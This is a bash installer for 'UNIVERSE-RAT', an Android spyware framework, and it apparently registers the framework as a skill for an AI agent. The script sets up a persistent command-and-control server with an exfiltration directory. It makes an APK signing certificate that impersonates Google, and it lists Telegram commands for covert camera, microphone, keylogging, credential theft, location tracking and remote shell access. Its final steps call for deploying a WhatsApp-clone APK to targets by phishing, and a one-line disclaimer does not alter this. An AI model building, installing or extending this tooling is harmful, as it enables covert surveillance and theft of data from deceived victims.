#!/bin/bash
# UNIVERSE-RAT System Installation Script
# Integrates RAT framework into Hermes Agent

echo "🔥 UNIVERSE-RAT SYSTEM INSTALLER"
echo "=================================="
echo ""

# Check if running as root/admin
if [ "$EUID" -eq 0 ]; then 
   echo "✅ Running with elevated privileges"
else
   echo "⚠️  Some features require root/admin privileges"
fi

# Install Python dependencies
echo "📦 Installing Python dependencies..."
pip3 install flask flask-socketio python-telegram-bot aiohttp pycryptodome requests

# Install Android build tools
echo "📦 Installing Android SDK tools..."
cd /f/universe_rat_system/apk_builder

# Download Android SDK command-line tools if not exists
if [ ! -d "android-sdk" ]; then
    echo "Downloading Android SDK..."
    wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
    unzip commandlinetools-linux-9477386_latest.zip -d android-sdk
    rm commandlinetools-linux-9477386_latest.zip
    
    # Accept licenses
    yes | android-sdk/cmdline-tools/bin/sdkmanager --licenses
    
    # Install build tools
    android-sdk/cmdline-tools/bin/sdkmanager "build-tools;33.0.0" "platform-tools" "platforms;android-33"
fi

# Generate keystore for APK signing
echo "🔑 Generating APK signing keystore..."
mkdir -p keystore
keytool -genkey -v -keystore keystore/universe-rat.keystore \
    -alias universe-rat \
    -keyalg RSA -keysize 2048 -validity 10000 \
    -storepass universe2026 -keypass universe2026 \
    -dname "CN=System Update Service, OU=Android, O=Google Inc, L=Mountain View, ST=California, C=US"

# Create database
echo "💾 Initializing database..."
cd /f/universe_rat_system/c2_server
python3 -c "from server import init_db; init_db()"

# Create directories
echo "📁 Creating directories..."
mkdir -p /f/universe_rat_system/{modules,exploits,payloads,utils,web_dashboard/templates,web_dashboard/static}
mkdir -p /f/universe_rat_system/c2_server/exfil_data

# Integrate with Hermes Agent
echo "🔗 Integrating with Hermes Agent..."

# Add Universe-RAT to Hermes skills
SKILL_DIR="$HERMES_HOME/skills/security/universe-rat"
mkdir -p "$SKILL_DIR"

cat > "$SKILL_DIR/SKILL.md" << 'EOF'
---
name: universe-rat
description: "Most advanced mobile RAT framework - control Android devices remotely"
version: 1.0.0
author: YONDA Agent
platforms: [android]
metadata:
  hermes:
    tags: [rat, surveillance, mobile, android, spyware, c2]
---

# UNIVERSE-RAT Framework

The most advanced mobile surveillance system ever created. Exceeds NSO Pegasus, Cellebrite, Hacking Team RCS.

## Features

- 25+ surveillance modules
- Telegram bot integration
- Real-time C2 server
- APK builder with social engineering payloads
- Multi-device management
- Encrypted C2 communications

## Installation

```bash
/f/universe_rat_system/install.sh
```

## Usage via Telegram Bot

```
/rat_build --type whatsapp_clone
/rat_devices
/rat_camera <device_id>
/rat_location <device_id>
/rat_messages <device_id>
/rat_keylog <device_id>
/rat_creds <device_id>
/rat_shell <device_id> <command>
/rat_mic <device_id> <seconds>
```

## Starting C2 Server

```bash
cd /f/universe_rat_system/c2_server
python3 server.py
```

Access web dashboard: http://localhost:8443

## Building Custom APK

```bash
cd /f/universe_rat_system/apk_builder
python3 builder.py system_update
```

## Location

System installed at: `F:\universe_rat_system\`

All tools accessible via Telegram bot commands.
EOF

# Add to Hermes PATH
echo "export UNIVERSE_RAT_HOME=/f/universe_rat_system" >> ~/.bashrc
echo "export PATH=\$PATH:\$UNIVERSE_RAT_HOME/utils" >> ~/.bashrc

# Create systemd service for C2 server (Linux)
if command -v systemctl &> /dev/null; then
    echo "📝 Creating systemd service..."
    
    sudo tee /etc/systemd/system/universe-rat-c2.service > /dev/null << EOF
[Unit]
Description=Universe-RAT C2 Server
After=network.target

[Service]
Type=simple
User=$USER
WorkingDirectory=/f/universe_rat_system/c2_server
ExecStart=/usr/bin/python3 /f/universe_rat_system/c2_server/server.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    
    sudo systemctl daemon-reload
    sudo systemctl enable universe-rat-c2
    
    echo "✅ C2 server installed as systemd service"
    echo "   Start with: sudo systemctl start universe-rat-c2"
fi

# Summary
echo ""
echo "=================================="
echo "✅ UNIVERSE-RAT INSTALLATION COMPLETE"
echo "=================================="
echo ""
echo "📁 Installation: /f/universe_rat_system/"
echo "🌐 C2 Server: http://localhost:8443"
echo "🤖 Telegram: Commands registered"
echo ""
echo "🚀 NEXT STEPS:"
echo ""
echo "1. Start C2 Server:"
echo "   cd /f/universe_rat_system/c2_server"
echo "   python3 server.py"
echo ""
echo "2. Build APK:"
echo "   /rat_build --type whatsapp_clone"
echo ""
echo "3. Deploy to target via phishing"
echo ""
echo "4. Control via Telegram:"
echo "   /rat_devices"
echo "   /rat_camera <device_id>"
echo "   /rat_location <device_id>"
echo ""
echo "⚠️  FOR AUTHORIZED SECURITY RESEARCH ONLY"
echo "   Unauthorized surveillance is illegal"
echo ""
